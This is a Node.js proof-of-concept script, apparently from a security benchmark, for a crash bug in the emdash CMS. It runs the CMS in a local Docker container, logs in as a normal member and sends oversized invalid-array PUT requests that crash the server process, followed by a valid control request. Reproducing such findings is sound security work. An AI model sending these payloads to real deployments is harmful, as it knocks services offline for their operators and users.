/**
 * 5-6 (destructive): an authenticated member crashes the CMS with one request.
 *
 *   node bench/security/dos-poc.mjs
 *
 * Runs the benchmark image under the 350 MiB limit, logs in as a normal member,
 * and sends content PUTs whose array fields fail validation. A ~2 MiB body
 * (1,000,000-element invalid array), well under the 10 MiB body limit, crashes
 * the Node process (SIGSEGV, container exit 139) until it is restarted. Valid
 * large bodies are handled normally. Not fixed by bumping zod to 4.6.7.
 *
 * This crashes the container, so it is kept out of verify/ and run by hand.
 * Needs: bench/prepare.sh already run, Docker, a free port 4372 and mock port 4452.
 */

import { execFileSync } from "node:child_process";
import { mkdirSync } from "node:fs";

import { discordLogin, ENCRYPTION_KEY, startMockDiscord, USERS } from "../../verify/lib.mjs";
import { setupAdmin } from "../../verify/setup-admin.mjs";

const project = "dos-poc", port = "4372", mockPort = 4452;
const outbox = `/home/user/sandbox-emdash/bench/.build/outbox-${project}`;
mkdirSync(outbox, { recursive: true });
const env = { ...process.env, PORT: port, MEMSWAP: "350m", VARIANT: "standard", MOCK_PORT: String(mockPort), OUTBOX_DIR: outbox, EMDASH_ENCRYPTION_KEY: ENCRYPTION_KEY, NODE_OPTIONS: "" };
const compose = (...a) => execFileSync("docker", ["compose", "-p", project, "-f", "/home/user/sandbox-emdash/bench/compose.yaml", ...a], { env, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
const base = `http://localhost:${port}`;
const up = async () => {
	for (let i = 0; i < 100; i++) {
		try { if ((await fetch(base + "/_emdash/api/health", { signal: AbortSignal.timeout(2000) })).ok) return true; } catch {}
		await new Promise((r) => setTimeout(r, 300));
	}
	return false;
};

try { compose("down", "-v"); } catch {}
compose("up", "-d");
const id = compose("ps", "-q", "cms").trim();
await up();
const mock = await startMockDiscord({ host: "0.0.0.0", port: mockPort });
const r = await setupAdmin(base);
await r.browser.close();
const { client: m } = await discordLogin(base, mock, USERS.member);
const a = (await m.post("/_emdash/api/content/articles", { data: { title: "poc" } })).json.data.item;

async function send(label, body) {
	const t = Date.now();
	let status;
	try {
		const res = await fetch(`${base}/_emdash/api/content/articles/${a.id}`, {
			method: "PUT",
			headers: { cookie: m.cookieHeader(), "content-type": "application/json", "x-emdash-request": "1", origin: base },
			body,
			signal: AbortSignal.timeout(60000),
		});
		status = res.status + " " + (await res.text()).slice(0, 80);
	} catch (e) { status = "FAILED " + (e.cause?.code ?? e.name); }
	const st = JSON.parse(execFileSync("docker", ["inspect", "-f", "{{json .State}}", id], { encoding: "utf8" }));
	console.log(`${label}\n  body=${(body.length / 1024 / 1024).toFixed(2)} MiB -> ${status} ${Date.now() - t}ms exit=${st.ExitCode} running=${st.Running} oom=${st.OOMKilled}`);
	if (!st.Running) { compose("start", "cms"); await up(); }
}

await send("invalid array (0 x 4.9M)", `{"taxonomies":{"tag":[${"0,".repeat(4_899_999)}0]}}`);
await send("invalid array (0 x 1M) — 2 MiB body", `{"taxonomies":{"tag":[${"0,".repeat(999_999)}0]}}`);
await send("valid 9 MiB string body (control)", `{"data":{"title":"${"A".repeat(9_000_000)}"}}`);

mock.stop();
compose("down", "-v");
